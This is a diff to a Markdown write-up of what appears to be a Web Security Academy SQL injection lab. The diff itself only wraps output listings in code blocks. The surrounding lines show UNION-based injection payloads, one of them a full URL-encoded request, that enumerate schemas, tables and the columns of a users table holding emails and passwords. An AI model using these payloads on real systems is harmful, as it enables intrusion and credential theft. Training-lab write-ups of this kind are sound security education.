@@ -97,9 +97,11 @@ Gifts' union select NULL, schema_name from information_schema.schemata-- -
 
  - We list the databases (schemas)
 
+   ```
    information_schema  
    public  
    pg_catalog
+   ```
 
 ```
 Gifts' union select NULL, table_name from information_schema.tables where table_schema='public'-- -
@@ -107,8 +109,10 @@ Gifts' union select NULL, table_name from information_schema.tables where table_
 
  - We list the tables
 
+   ```
    products  
    users_nhidli
+   ```
 
 ```
 https://0a10003e04660c738037f3eb008e008a.web-security-academy.net/filter?category=Gifts%27%20union%20select%20NULL,%20column_name%20from%20information_schema.columns%20where%20table_schema=%27public%27%20and%20table_name=%27users_nhidli%27--%20-
@@ -116,9 +120,11 @@ https://0a10003e04660c738037f3eb008e008a.web-security-academy.net/filter?categor
 
  - Then we list the columns
 
+   ```
    email  
    password_ykbnqh  
    username_aruvwo
+   ```
 
 - And finally, we retrieve the contents of those columns:
 
